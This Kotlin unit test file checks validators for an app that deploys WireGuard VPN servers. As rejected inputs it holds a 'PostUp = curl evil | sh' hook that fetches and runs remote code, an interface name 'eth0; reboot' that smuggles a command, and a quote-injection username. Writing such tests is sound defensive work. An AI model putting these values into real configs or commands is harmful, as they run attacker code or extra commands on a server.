package app.rawline.mobile.deploy

import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Test

class WdttPlusExitTest {
    private val config = """
        [Interface]
        PrivateKey = cHJpdmF0ZQ==
        Address = 10.0.0.2/32
        DNS = 1.1.1.1
        [Peer]
        PublicKey = cHVibGlj
        Endpoint = vpn.example.com:51820
        AllowedIPs = 0.0.0.0/0
    """.trimIndent()

    @Test fun wireGuardFileMustBeAFullTunnelWithoutHooks() {
        assertTrue(validateWireGuardConfigText(config).isSuccess)
        assertTrue(validateWireGuardConfigText(config.replace("0.0.0.0/0", "10.0.0.0/8")).isFailure)
        assertTrue(validateWireGuardConfigText(config.replace("DNS = 1.1.1.1", "PostUp = curl evil | sh")).isFailure)
        assertTrue(validateWireGuardConfigText(config.replace(":51820", "")).isFailure)
        assertTrue(validateWireGuardConfigText("$config\n[Peer]\nPublicKey = eA==\nEndpoint = a.b:1\nAllowedIPs = 0.0.0.0/0").isFailure)
    }

    @Test fun sanitizedFileOnlyRoutesWdttClients() {
        val clean = sanitizeWireGuardConfigForWdttExit(config)
        assertTrue(clean.contains("Table = off"))
        assertFalse(clean.contains("DNS"))
        assertTrue(clean.indexOf("Table = off") < clean.indexOf("[Peer]"))
    }

    @Test fun tunCandidatesSkipReservedAndListRunningFirst() {
        val found = parseTunInterfaceCandidates("WDTT_TUN_CANDIDATE=tun1|0\nWDTT_TUN_CANDIDATE=wdtt0|1\nnoise\nWDTT_TUN_CANDIDATE=awg0|1\nWDTT_TUN_CANDIDATE=bad name|1")
        assertEquals(listOf("awg0" to true, "tun1" to false), found.map { it.name to it.isUp })
        assertNotNull(tunInterfaceNameIssue("wg-wdtt-exit"))
        assertNotNull(tunInterfaceNameIssue("eth0; reboot"))
        assertNull(tunInterfaceNameIssue("tun0"))
    }

    @Test fun proxyCredentialsAreCheckedBeforeTheyReachAScript() {
        assertNull(localProxyCredentialsIssue("user", "password1"))
        assertNotNull(localProxyCredentialsIssue("user", "short"))
        assertNotNull(localProxyCredentialsIssue("us'er", "password1"))
        assertNull(externalProxyCredentialsIssue("", ""))
        assertNotNull(externalProxyCredentialsIssue("user", ""))
        assertNotNull(externalProxyCredentialsIssue("a:b", "pass"))
        assertTrue("1.2.3.4".isValidPublicHost())
        assertFalse("http://host".isValidPublicHost())
        assertFalse("localhost".isValidPublicHost())
    }

    @Test fun markersAndRootCommandKeepScriptsLiteral() {
        assertEquals("disk_full", markerValue("log\nWDTT_ERROR=disk_full\n", "WDTT_ERROR"))
        assertNull(markerValue("no marker", "WDTT_ERROR"))
        assertTrue(rootCommand("echo \$(id)").contains("bash -c 'echo \$(id)'"))
    }

    @Test fun wdttPlusDeployNeedsItsInstallerResultLine() {
        assertTrue(DeployProtocol.successful("wdttplus", 0, "log\nWDTT_INSTALL_RESULT=success\n"))
        assertFalse(DeployProtocol.successful("wdttplus", 0, "WDTT_INSTALL_RESULT=failed"))
        assertFalse(DeployProtocol.successful("wdttplus", 1, "WDTT_INSTALL_RESULT=success"))
        assertEquals(40 to "Сервис", DeployProtocol.progress("wdttplus", "WDTT_PROGRESS|0.40|Сервис"))
    }

    @Test fun adminAccessReadsServerStatuses() {
        val access = WdttPlusAdmin.Access(JSONObject("""{"password":"p1","status":"expired_retained","vk_hash":"a, b;c","traffic":{"all":{"down":5,"up":7}}}"""))
        assertTrue(access.expired)
        assertFalse(access.deactivated)
        assertEquals(listOf("a", "b", "c"), access.hashes)
        assertEquals(12L, access.traffic("all"))
        assertEquals("p1", access.title)
    }

    @Test fun warpCheckAndRestartReachTheServerThroughThePinnedSession() {
        // A closed local port: the call must fail on connecting, not before it.
        val port = java.net.ServerSocket(0).use { it.localPort }
        val server = DeployServer.create("wdttplus").apply {
            set("host", "127.0.0.1"); set("sshPort", port.toString()); set("user", "root")
            set("auth", "password"); set("sshPassword", "x"); set("hostKey", "SHA256:pinned")
        }
        val target = OutboundSshTarget(WdttPlusAdmin(server), server)
        for (restart in listOf(true, false)) {
            val error = runCatching { kotlinx.coroutines.runBlocking { checkFreeWarp(target, restart) } }.exceptionOrNull()
            assertTrue("restart=$restart: $error", error is com.jcraft.jsch.JSchException)
        }
    }
}

class QwdttSubscriptionsTest {
    private fun access(password: String) = QwdttAdmin.Access(password, "", "", 1, emptyList(), 0, false, 0, 0, 0)

    @Test fun ownerPasswordIsNotListedAsAUser() {
        val server = DeployServer.create("qwdtt").apply { set("password", "owner") }
        val shown = QwdttAdmin(server).subscriptions(listOf(access("owner"), access("alice"), access("bob")))
        assertEquals(listOf("alice", "bob"), shown.map { it.password })
        assertEquals(1, QwdttAdmin(DeployServer.create("qwdtt").apply { set("password", "") }).subscriptions(listOf(access(""))).size)
    }
}
